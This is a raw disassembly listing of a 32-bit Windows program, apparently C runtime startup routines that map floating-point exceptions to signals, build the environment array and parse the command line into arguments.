  4038aa:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%ecx)
  4038b0:	75 0f                	jne    0x4038c1
  4038b2:	c7 05 74 2d 42 00 83 	movl   $0x83,0x422d74
  4038b9:	00 00 00 
  4038bc:	e9 88 00 00 00       	jmp    0x403949
  4038c1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4038c4:	81 3a 90 00 00 c0    	cmpl   $0xc0000090,(%edx)
  4038ca:	75 0c                	jne    0x4038d8
  4038cc:	c7 05 74 2d 42 00 81 	movl   $0x81,0x422d74
  4038d3:	00 00 00 
  4038d6:	eb 71                	jmp    0x403949
  4038d8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4038db:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%eax)
  4038e1:	75 0c                	jne    0x4038ef
  4038e3:	c7 05 74 2d 42 00 84 	movl   $0x84,0x422d74
  4038ea:	00 00 00 
  4038ed:	eb 5a                	jmp    0x403949
  4038ef:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4038f2:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%ecx)
  4038f8:	75 0c                	jne    0x403906
  4038fa:	c7 05 74 2d 42 00 85 	movl   $0x85,0x422d74
  403901:	00 00 00 
  403904:	eb 43                	jmp    0x403949
  403906:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403909:	81 3a 8d 00 00 c0    	cmpl   $0xc000008d,(%edx)
  40390f:	75 0c                	jne    0x40391d
  403911:	c7 05 74 2d 42 00 82 	movl   $0x82,0x422d74
  403918:	00 00 00 
  40391b:	eb 2c                	jmp    0x403949
  40391d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403920:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%eax)
  403926:	75 0c                	jne    0x403934
  403928:	c7 05 74 2d 42 00 86 	movl   $0x86,0x422d74
  40392f:	00 00 00 
  403932:	eb 15                	jmp    0x403949
  403934:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403937:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%ecx)
  40393d:	75 0a                	jne    0x403949
  40393f:	c7 05 74 2d 42 00 8a 	movl   $0x8a,0x422d74
  403946:	00 00 00 
  403949:	8b 15 74 2d 42 00    	mov    0x422d74,%edx
  40394f:	52                   	push   %edx
  403950:	6a 08                	push   $0x8
  403952:	ff 55 fc             	call   *-0x4(%ebp)
  403955:	83 c4 08             	add    $0x8,%esp
  403958:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40395b:	a3 74 2d 42 00       	mov    %eax,0x422d74
  403960:	eb 17                	jmp    0x403979
  403962:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403965:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  40396c:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40396f:	8b 42 04             	mov    0x4(%edx),%eax
  403972:	50                   	push   %eax
  403973:	ff 55 fc             	call   *-0x4(%ebp)
  403976:	83 c4 04             	add    $0x4,%esp
  403979:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40397c:	89 0d 1c 36 42 00    	mov    %ecx,0x42361c
  403982:	83 c8 ff             	or     $0xffffffff,%eax
  403985:	8b e5                	mov    %ebp,%esp
  403987:	5d                   	pop    %ebp
  403988:	c3                   	ret    
  403989:	cc                   	int3   
  40398a:	cc                   	int3   
  40398b:	cc                   	int3   
  40398c:	cc                   	int3   
  40398d:	cc                   	int3   
  40398e:	cc                   	int3   
  40398f:	cc                   	int3   
  403990:	55                   	push   %ebp
  403991:	8b ec                	mov    %esp,%ebp
  403993:	51                   	push   %ecx
  403994:	c7 45 fc f0 2c 42 00 	movl   $0x422cf0,-0x4(%ebp)
  40399b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40399e:	8b 08                	mov    (%eax),%ecx
  4039a0:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  4039a3:	74 1d                	je     0x4039c2
  4039a5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4039a8:	83 c2 0c             	add    $0xc,%edx
  4039ab:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4039ae:	a1 70 2d 42 00       	mov    0x422d70,%eax
  4039b3:	6b c0 0c             	imul   $0xc,%eax,%eax
  4039b6:	05 f0 2c 42 00       	add    $0x422cf0,%eax
  4039bb:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  4039be:	73 02                	jae    0x4039c2
  4039c0:	eb d9                	jmp    0x40399b
  4039c2:	8b 0d 70 2d 42 00    	mov    0x422d70,%ecx
  4039c8:	6b c9 0c             	imul   $0xc,%ecx,%ecx
  4039cb:	81 c1 f0 2c 42 00    	add    $0x422cf0,%ecx
  4039d1:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  4039d4:	73 0a                	jae    0x4039e0
  4039d6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4039d9:	8b 02                	mov    (%edx),%eax
  4039db:	3b 45 08             	cmp    0x8(%ebp),%eax
  4039de:	74 04                	je     0x4039e4
  4039e0:	33 c0                	xor    %eax,%eax
  4039e2:	eb 03                	jmp    0x4039e7
  4039e4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4039e7:	8b e5                	mov    %ebp,%esp
  4039e9:	5d                   	pop    %ebp
  4039ea:	c3                   	ret    
  4039eb:	cc                   	int3   
  4039ec:	cc                   	int3   
  4039ed:	cc                   	int3   
  4039ee:	cc                   	int3   
  4039ef:	cc                   	int3   
  4039f0:	55                   	push   %ebp
  4039f1:	8b ec                	mov    %esp,%ebp
  4039f3:	83 ec 10             	sub    $0x10,%esp
  4039f6:	83 3d b0 3b 42 00 00 	cmpl   $0x0,0x423bb0
  4039fd:	75 05                	jne    0x403a04
  4039ff:	e8 4c 4f 00 00       	call   0x408950
  403a04:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403a0b:	a1 b0 35 42 00       	mov    0x4235b0,%eax
  403a10:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a13:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a16:	0f be 11             	movsbl (%ecx),%edx
  403a19:	85 d2                	test   %edx,%edx
  403a1b:	74 2c                	je     0x403a49
  403a1d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403a20:	0f be 08             	movsbl (%eax),%ecx
  403a23:	83 f9 3d             	cmp    $0x3d,%ecx
  403a26:	74 09                	je     0x403a31
  403a28:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403a2b:	83 c2 01             	add    $0x1,%edx
  403a2e:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403a31:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403a34:	50                   	push   %eax
  403a35:	e8 56 fb ff ff       	call   0x403590
  403a3a:	83 c4 04             	add    $0x4,%esp
  403a3d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a40:	8d 54 01 01          	lea    0x1(%ecx,%eax,1),%edx
  403a44:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403a47:	eb ca                	jmp    0x403a13
  403a49:	6a 6d                	push   $0x6d
  403a4b:	68 24 05 42 00       	push   $0x420524
  403a50:	6a 02                	push   $0x2
  403a52:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403a55:	8d 0c 85 04 00 00 00 	lea    0x4(,%eax,4),%ecx
  403a5c:	51                   	push   %ecx
  403a5d:	e8 be 10 00 00       	call   0x404b20
  403a62:	83 c4 10             	add    $0x10,%esp
  403a65:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403a68:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403a6b:	89 15 f4 35 42 00    	mov    %edx,0x4235f4
  403a71:	83 3d f4 35 42 00 00 	cmpl   $0x0,0x4235f4
  403a78:	75 0a                	jne    0x403a84
  403a7a:	6a 09                	push   $0x9
  403a7c:	e8 4f dc ff ff       	call   0x4016d0
  403a81:	83 c4 04             	add    $0x4,%esp
  403a84:	a1 b0 35 42 00       	mov    0x4235b0,%eax
  403a89:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403a8c:	eb 09                	jmp    0x403a97
  403a8e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403a91:	03 4d f0             	add    -0x10(%ebp),%ecx
  403a94:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403a97:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403a9a:	0f be 02             	movsbl (%edx),%eax
  403a9d:	85 c0                	test   %eax,%eax
  403a9f:	74 66                	je     0x403b07
  403aa1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403aa4:	51                   	push   %ecx
  403aa5:	e8 e6 fa ff ff       	call   0x403590
  403aaa:	83 c4 04             	add    $0x4,%esp
  403aad:	83 c0 01             	add    $0x1,%eax
  403ab0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403ab3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403ab6:	0f be 02             	movsbl (%edx),%eax
  403ab9:	83 f8 3d             	cmp    $0x3d,%eax
  403abc:	74 47                	je     0x403b05
  403abe:	6a 79                	push   $0x79
  403ac0:	68 24 05 42 00       	push   $0x420524
  403ac5:	6a 02                	push   $0x2
  403ac7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403aca:	51                   	push   %ecx
  403acb:	e8 50 10 00 00       	call   0x404b20
  403ad0:	83 c4 10             	add    $0x10,%esp
  403ad3:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403ad6:	89 02                	mov    %eax,(%edx)
  403ad8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403adb:	83 38 00             	cmpl   $0x0,(%eax)
  403ade:	75 0a                	jne    0x403aea
  403ae0:	6a 09                	push   $0x9
  403ae2:	e8 e9 db ff ff       	call   0x4016d0
  403ae7:	83 c4 04             	add    $0x4,%esp
  403aea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403aed:	51                   	push   %ecx
  403aee:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403af1:	8b 02                	mov    (%edx),%eax
  403af3:	50                   	push   %eax
  403af4:	e8 07 37 00 00       	call   0x407200
  403af9:	83 c4 08             	add    $0x8,%esp
  403afc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403aff:	83 c1 04             	add    $0x4,%ecx
  403b02:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  403b05:	eb 87                	jmp    0x403a8e
  403b07:	6a 02                	push   $0x2
  403b09:	8b 15 b0 35 42 00    	mov    0x4235b0,%edx
  403b0f:	52                   	push   %edx
  403b10:	e8 4b 1a 00 00       	call   0x405560
  403b15:	83 c4 08             	add    $0x8,%esp
  403b18:	c7 05 b0 35 42 00 00 	movl   $0x0,0x4235b0
  403b1f:	00 00 00 
  403b22:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403b25:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403b2b:	c7 05 a0 3b 42 00 01 	movl   $0x1,0x423ba0
  403b32:	00 00 00 
  403b35:	8b e5                	mov    %ebp,%esp
  403b37:	5d                   	pop    %ebp
  403b38:	c3                   	ret    
  403b39:	cc                   	int3   
  403b3a:	cc                   	int3   
  403b3b:	cc                   	int3   
  403b3c:	cc                   	int3   
  403b3d:	cc                   	int3   
  403b3e:	cc                   	int3   
  403b3f:	cc                   	int3   
  403b40:	55                   	push   %ebp
  403b41:	8b ec                	mov    %esp,%ebp
  403b43:	83 ec 14             	sub    $0x14,%esp
  403b46:	83 3d b0 3b 42 00 00 	cmpl   $0x0,0x423bb0
  403b4d:	75 05                	jne    0x403b54
  403b4f:	e8 fc 4d 00 00       	call   0x408950
  403b54:	68 04 01 00 00       	push   $0x104
  403b59:	68 20 36 42 00       	push   $0x423620
  403b5e:	6a 00                	push   $0x0
  403b60:	ff 15 b8 51 42 00    	call   *0x4251b8
  403b66:	c7 05 04 36 42 00 20 	movl   $0x423620,0x423604
  403b6d:	36 42 00 
  403b70:	a1 24 4f 42 00       	mov    0x424f24,%eax
  403b75:	0f be 08             	movsbl (%eax),%ecx
  403b78:	85 c9                	test   %ecx,%ecx
  403b7a:	75 0b                	jne    0x403b87
  403b7c:	8b 15 04 36 42 00    	mov    0x423604,%edx
  403b82:	89 55 ec             	mov    %edx,-0x14(%ebp)
  403b85:	eb 08                	jmp    0x403b8f
  403b87:	a1 24 4f 42 00       	mov    0x424f24,%eax
  403b8c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403b8f:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403b92:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403b95:	8d 55 fc             	lea    -0x4(%ebp),%edx
  403b98:	52                   	push   %edx
  403b99:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403b9c:	50                   	push   %eax
  403b9d:	6a 00                	push   $0x0
  403b9f:	6a 00                	push   $0x0
  403ba1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403ba4:	51                   	push   %ecx
  403ba5:	e8 76 00 00 00       	call   0x403c20
  403baa:	83 c4 14             	add    $0x14,%esp
  403bad:	68 80 00 00 00       	push   $0x80
  403bb2:	68 30 05 42 00       	push   $0x420530
  403bb7:	6a 02                	push   $0x2
  403bb9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403bbc:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403bbf:	8d 0c 90             	lea    (%eax,%edx,4),%ecx
  403bc2:	51                   	push   %ecx
  403bc3:	e8 58 0f 00 00       	call   0x404b20
  403bc8:	83 c4 10             	add    $0x10,%esp
  403bcb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403bce:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403bd2:	75 0a                	jne    0x403bde
  403bd4:	6a 08                	push   $0x8
  403bd6:	e8 f5 da ff ff       	call   0x4016d0
  403bdb:	83 c4 04             	add    $0x4,%esp
  403bde:	8d 55 fc             	lea    -0x4(%ebp),%edx
  403be1:	52                   	push   %edx
  403be2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403be5:	50                   	push   %eax
  403be6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403be9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403bec:	8d 04 8a             	lea    (%edx,%ecx,4),%eax
  403bef:	50                   	push   %eax
  403bf0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403bf3:	51                   	push   %ecx
  403bf4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403bf7:	52                   	push   %edx
  403bf8:	e8 23 00 00 00       	call   0x403c20
  403bfd:	83 c4 14             	add    $0x14,%esp
  403c00:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403c03:	83 e8 01             	sub    $0x1,%eax
  403c06:	a3 e8 35 42 00       	mov    %eax,0x4235e8
  403c0b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403c0e:	89 0d ec 35 42 00    	mov    %ecx,0x4235ec
  403c14:	8b e5                	mov    %ebp,%esp
  403c16:	5d                   	pop    %ebp
  403c17:	c3                   	ret    
  403c18:	cc                   	int3   
  403c19:	cc                   	int3   
  403c1a:	cc                   	int3   
  403c1b:	cc                   	int3   
  403c1c:	cc                   	int3   
  403c1d:	cc                   	int3   
  403c1e:	cc                   	int3   
  403c1f:	cc                   	int3   
  403c20:	55                   	push   %ebp
  403c21:	8b ec                	mov    %esp,%ebp
  403c23:	83 ec 14             	sub    $0x14,%esp
  403c26:	8b 45 18             	mov    0x18(%ebp),%eax
  403c29:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403c2f:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403c32:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  403c38:	8b 55 08             	mov    0x8(%ebp),%edx
  403c3b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403c3e:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403c42:	74 11                	je     0x403c55
  403c44:	8b 45 0c             	mov    0xc(%ebp),%eax
  403c47:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403c4a:	89 08                	mov    %ecx,(%eax)
  403c4c:	8b 55 0c             	mov    0xc(%ebp),%edx
  403c4f:	83 c2 04             	add    $0x4,%edx
  403c52:	89 55 0c             	mov    %edx,0xc(%ebp)
  403c55:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c58:	0f be 08             	movsbl (%eax),%ecx
  403c5b:	83 f9 22             	cmp    $0x22,%ecx
  403c5e:	0f 85 c9 00 00 00    	jne    0x403d2d
  403c64:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403c67:	83 c2 01             	add    $0x1,%edx
  403c6a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403c6d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403c70:	0f be 08             	movsbl (%eax),%ecx
  403c73:	83 f9 22             	cmp    $0x22,%ecx
  403c76:	74 7a                	je     0x403cf2
  403c78:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403c7b:	0f be 02             	movsbl (%edx),%eax
  403c7e:	85 c0                	test   %eax,%eax
  403c80:	74 70                	je     0x403cf2
  403c82:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403c85:	33 d2                	xor    %edx,%edx
  403c87:	8a 11                	mov    (%ecx),%dl
  403c89:	33 c0                	xor    %eax,%eax
  403c8b:	8a 82 41 39 42 00    	mov    0x423941(%edx),%al
  403c91:	83 e0 04             	and    $0x4,%eax
  403c94:	85 c0                	test   %eax,%eax
  403c96:	74 2f                	je     0x403cc7
  403c98:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403c9b:	8b 11                	mov    (%ecx),%edx
  403c9d:	83 c2 01             	add    $0x1,%edx
  403ca0:	8b 45 18             	mov    0x18(%ebp),%eax
  403ca3:	89 10                	mov    %edx,(%eax)
  403ca5:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403ca9:	74 1c                	je     0x403cc7
  403cab:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403cae:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403cb1:	8a 02                	mov    (%edx),%al
  403cb3:	88 01                	mov    %al,(%ecx)
  403cb5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403cb8:	83 c1 01             	add    $0x1,%ecx
  403cbb:	89 4d 10             	mov    %ecx,0x10(%ebp)
  403cbe:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403cc1:	83 c2 01             	add    $0x1,%edx
  403cc4:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403cc7:	8b 45 18             	mov    0x18(%ebp),%eax
  403cca:	8b 08                	mov    (%eax),%ecx
  403ccc:	83 c1 01             	add    $0x1,%ecx
  403ccf:	8b 55 18             	mov    0x18(%ebp),%edx
  403cd2:	89 0a                	mov    %ecx,(%edx)
  403cd4:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403cd8:	74 13                	je     0x403ced
  403cda:	8b 45 10             	mov    0x10(%ebp),%eax
  403cdd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403ce0:	8a 11                	mov    (%ecx),%dl
  403ce2:	88 10                	mov    %dl,(%eax)
  403ce4:	8b 45 10             	mov    0x10(%ebp),%eax
  403ce7:	83 c0 01             	add    $0x1,%eax
  403cea:	89 45 10             	mov    %eax,0x10(%ebp)
  403ced:	e9 72 ff ff ff       	jmp    0x403c64
  403cf2:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403cf5:	8b 11                	mov    (%ecx),%edx
  403cf7:	83 c2 01             	add    $0x1,%edx
  403cfa:	8b 45 18             	mov    0x18(%ebp),%eax
  403cfd:	89 10                	mov    %edx,(%eax)
  403cff:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403d03:	74 0f                	je     0x403d14
  403d05:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403d08:	c6 01 00             	movb   $0x0,(%ecx)
  403d0b:	8b 55 10             	mov    0x10(%ebp),%edx
  403d0e:	83 c2 01             	add    $0x1,%edx
  403d11:	89 55 10             	mov    %edx,0x10(%ebp)
  403d14:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d17:	0f be 08             	movsbl (%eax),%ecx
  403d1a:	83 f9 22             	cmp    $0x22,%ecx
  403d1d:	75 09                	jne    0x403d28
  403d1f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403d22:	83 c2 01             	add    $0x1,%edx
  403d25:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403d28:	e9 cf 00 00 00       	jmp    0x403dfc
  403d2d:	8b 45 18             	mov    0x18(%ebp),%eax
  403d30:	8b 08                	mov    (%eax),%ecx
  403d32:	83 c1 01             	add    $0x1,%ecx
  403d35:	8b 55 18             	mov    0x18(%ebp),%edx
  403d38:	89 0a                	mov    %ecx,(%edx)
  403d3a:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403d3e:	74 13                	je     0x403d53
  403d40:	8b 45 10             	mov    0x10(%ebp),%eax
  403d43:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403d46:	8a 11                	mov    (%ecx),%dl
  403d48:	88 10                	mov    %dl,(%eax)
  403d4a:	8b 45 10             	mov    0x10(%ebp),%eax
  403d4d:	83 c0 01             	add    $0x1,%eax
  403d50:	89 45 10             	mov    %eax,0x10(%ebp)
  403d53:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403d56:	8a 11                	mov    (%ecx),%dl
  403d58:	88 55 f4             	mov    %dl,-0xc(%ebp)
  403d5b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d5e:	83 c0 01             	add    $0x1,%eax
  403d61:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403d64:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403d67:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403d6d:	33 d2                	xor    %edx,%edx
  403d6f:	8a 91 41 39 42 00    	mov    0x423941(%ecx),%dl
  403d75:	83 e2 04             	and    $0x4,%edx
  403d78:	85 d2                	test   %edx,%edx
  403d7a:	74 2f                	je     0x403dab
  403d7c:	8b 45 18             	mov    0x18(%ebp),%eax
  403d7f:	8b 08                	mov    (%eax),%ecx
  403d81:	83 c1 01             	add    $0x1,%ecx
  403d84:	8b 55 18             	mov    0x18(%ebp),%edx
  403d87:	89 0a                	mov    %ecx,(%edx)
  403d89:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403d8d:	74 13                	je     0x403da2
  403d8f:	8b 45 10             	mov    0x10(%ebp),%eax
  403d92:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403d95:	8a 11                	mov    (%ecx),%dl
  403d97:	88 10                	mov    %dl,(%eax)
  403d99:	8b 45 10             	mov    0x10(%ebp),%eax
  403d9c:	83 c0 01             	add    $0x1,%eax
  403d9f:	89 45 10             	mov    %eax,0x10(%ebp)
  403da2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403da5:	83 c1 01             	add    $0x1,%ecx
  403da8:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403dab:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403dae:	81 e2 ff 00 00 00    	and    $0xff,%edx
  403db4:	83 fa 20             	cmp    $0x20,%edx
  403db7:	74 1e                	je     0x403dd7
  403db9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403dbc:	25 ff 00 00 00       	and    $0xff,%eax
  403dc1:	85 c0                	test   %eax,%eax
  403dc3:	74 12                	je     0x403dd7
  403dc5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403dc8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403dce:	83 f9 09             	cmp    $0x9,%ecx
  403dd1:	0f 85 56 ff ff ff    	jne    0x403d2d
  403dd7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403dda:	81 e2 ff 00 00 00    	and    $0xff,%edx
  403de0:	85 d2                	test   %edx,%edx
  403de2:	75 0b                	jne    0x403def
  403de4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403de7:	83 e8 01             	sub    $0x1,%eax
  403dea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ded:	eb 0d                	jmp    0x403dfc
  403def:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403df3:	74 07                	je     0x403dfc
  403df5:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403df8:	c6 41 ff 00          	movb   $0x0,-0x1(%ecx)
  403dfc:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  403e03:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403e06:	0f be 02             	movsbl (%edx),%eax
  403e09:	85 c0                	test   %eax,%eax
  403e0b:	74 21                	je     0x403e2e
  403e0d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403e10:	0f be 11             	movsbl (%ecx),%edx
  403e13:	83 fa 20             	cmp    $0x20,%edx
  403e16:	74 0b                	je     0x403e23
  403e18:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e1b:	0f be 08             	movsbl (%eax),%ecx
  403e1e:	83 f9 09             	cmp    $0x9,%ecx
  403e21:	75 0b                	jne    0x403e2e
  403e23:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403e26:	83 c2 01             	add    $0x1,%edx
  403e29:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403e2c:	eb df                	jmp    0x403e0d
  403e2e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e31:	0f be 08             	movsbl (%eax),%ecx
  403e34:	85 c9                	test   %ecx,%ecx
  403e36:	75 05                	jne    0x403e3d
  403e38:	e9 de 01 00 00       	jmp    0x40401b
  403e3d:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  403e41:	74 11                	je     0x403e54
  403e43:	8b 55 0c             	mov    0xc(%ebp),%edx
  403e46:	8b 45 10             	mov    0x10(%ebp),%eax
  403e49:	89 02                	mov    %eax,(%edx)
  403e4b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403e4e:	83 c1 04             	add    $0x4,%ecx
  403e51:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  403e54:	8b 55 14             	mov    0x14(%ebp),%edx
  403e57:	8b 02                	mov    (%edx),%eax
  403e59:	83 c0 01             	add    $0x1,%eax
  403e5c:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403e5f:	89 01                	mov    %eax,(%ecx)
  403e61:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  403e68:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403e6f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403e72:	0f be 02             	movsbl (%edx),%eax
  403e75:	83 f8 5c             	cmp    $0x5c,%eax
  403e78:	75 14                	jne    0x403e8e
  403e7a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403e7d:	83 c1 01             	add    $0x1,%ecx
  403e80:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403e83:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403e86:	83 c2 01             	add    $0x1,%edx
  403e89:	89 55 f0             	mov    %edx,-0x10(%ebp)
  403e8c:	eb e1                	jmp    0x403e6f
  403e8e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e91:	0f be 08             	movsbl (%eax),%ecx
  403e94:	83 f9 22             	cmp    $0x22,%ecx
  403e97:	75 51                	jne    0x403eea
  403e99:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403e9c:	33 d2                	xor    %edx,%edx
  403e9e:	b9 02 00 00 00       	mov    $0x2,%ecx
  403ea3:	f7 f1                	div    %ecx
  403ea5:	85 d2                	test   %edx,%edx
  403ea7:	75 39                	jne    0x403ee2
  403ea9:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403ead:	74 20                	je     0x403ecf
  403eaf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403eb2:	0f be 42 01          	movsbl 0x1(%edx),%eax
  403eb6:	83 f8 22             	cmp    $0x22,%eax
  403eb9:	75 0b                	jne    0x403ec6
  403ebb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403ebe:	83 c1 01             	add    $0x1,%ecx
  403ec1:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403ec4:	eb 07                	jmp    0x403ecd
  403ec6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403ecd:	eb 07                	jmp    0x403ed6
  403ecf:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  403ed6:	33 d2                	xor    %edx,%edx
  403ed8:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403edc:	0f 94 c2             	sete   %dl
  403edf:	89 55 ec             	mov    %edx,-0x14(%ebp)
  403ee2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403ee5:	d1 e8                	shr    %eax
  403ee7:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403eea:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403eed:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403ef0:	83 ea 01             	sub    $0x1,%edx
  403ef3:	89 55 f0             	mov    %edx,-0x10(%ebp)
  403ef6:	85 c9                	test   %ecx,%ecx
  403ef8:	74 24                	je     0x403f1e
  403efa:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403efe:	74 0f                	je     0x403f0f
  403f00:	8b 45 10             	mov    0x10(%ebp),%eax
  403f03:	c6 00 5c             	movb   $0x5c,(%eax)
  403f06:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f09:	83 c1 01             	add    $0x1,%ecx
  403f0c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  403f0f:	8b 55 18             	mov    0x18(%ebp),%edx
  403f12:	8b 02                	mov    (%edx),%eax
  403f14:	83 c0 01             	add    $0x1,%eax
  403f17:	8b 4d 18             	mov    0x18(%ebp),%ecx
